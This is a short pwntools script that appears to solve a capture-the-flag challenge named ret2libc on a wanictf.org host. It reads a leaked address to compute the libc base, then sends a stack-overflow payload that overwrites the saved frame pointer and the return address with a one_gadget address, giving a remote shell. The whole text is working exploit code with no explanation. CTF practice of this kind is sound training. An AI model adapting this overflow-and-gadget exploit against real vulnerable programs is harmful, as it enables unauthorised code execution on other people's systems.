from pwn import *

exe = ELF('./chall')
libc = ELF('./libc.so.6')

one = 0xebcf8

io = remote('ret2libc-pwn.wanictf.org', 9007)
#gdb.attach(io, api=True)
io.recvuntil(b'+0x28 | 0x')
libc.address = int(io.recvuntil(b' '), 16) - (libc.sym['__libc_start_call_main'] + 128)

io.recvuntil(b' > ')
payload = b'\0'*32 + p64(0x404500) + p64(libc.address + one)
payload += b'\0'*(128-len(payload))
io.sendline(payload)
io.interactive()